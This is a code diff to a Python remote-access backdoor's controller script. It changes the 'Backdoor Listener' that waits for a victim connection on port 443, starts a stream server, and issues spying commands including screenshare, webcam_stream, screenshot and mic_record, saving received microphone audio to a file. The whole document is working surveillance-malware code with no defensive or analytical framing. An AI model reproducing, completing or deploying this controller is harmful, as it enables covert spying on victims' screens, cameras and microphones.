@@ -5,8 +5,6 @@ import os
 import threading
 from termcolor import colored
 from vidstream import *
-from PIL import Image
-
 # =====================================================> Clears Terminal
 def Clear():
     if platform.system() == "Windows":
@@ -52,10 +50,10 @@ BUFFER_SIZE = 1024
 # =====================================================> Backdoor Listener
 
 def Listener():
-    ListenerHost= input(colored("[*] Enter Listener IP Adress: ", 'red'))
+    ListenerHost= input(colored("[*] Enter Listener IP Address: ", 'red'))
     ListenerPort= 443
     s.bind((ListenerHost, ListenerPort))
-    s.listen(10)
+    s.listen(99)
     time.sleep(1)
     print(colored("[*] Starting Listener...", 'cyan'))
     time.sleep(1)
@@ -63,16 +61,16 @@ def Listener():
     conn, addr = s.accept()
     recv_data = conn.recv(BUFFER_SIZE).decode("utf-8")
     with conn:
-        print(colored(f"Recived Connection From: {addr}: {recv_data}", 'blue'))
+        print(colored(f"Recived Connection From: {addr}:{recv_data}", 'blue'))
 
-        serv = StreamingServer(ListenerHost, 4833)
+        serv = StreamingServer(ListenerHost, 4444)
         serv.start_server()
         time.sleep(2)
         print(colored("[+] Connecting to the Session...", 'blue'))
 
         while True:
-            Handler = input(f"{addr[0]}:{recv_data} ⇄ ")
 
+            Handler = input(f"{addr[0]}:{recv_data} ⇄ ")
             if Handler == "screenshare":       
                 conn.send(Handler.encode("utf-8"))
             elif Handler == "webcam_stream":
@@ -86,19 +84,19 @@ def Listener():
                 exit()
             elif Handler == "screenshot":
                 conn.send(Handler.encode("utf-8"))
-            elif Handler == "ipconfig":
+            elif Handler == "exit":
+                print(colored("[*] Exiting From Active Session...", "red"))
+                time.sleep(2)
+                break
+            elif Handler == "mic_record":
                 conn.send(Handler.encode("utf-8"))
-            elif Handler == "audio_record":
-                conn.send(Handler.encode("utf-8"))
-            elif Handler == "audio_record_stop":
-            	conn.send(Handler.encode("utf-8"))
-                with open("vid0.wav", "swb") as f:
+                with open('aud0.wav','wb') as f: 
                     while True:
                         l = conn.recv(1024)
                         if not l: break
                         f.write(l)
 
-                
+                # unfinished code
 
 
 
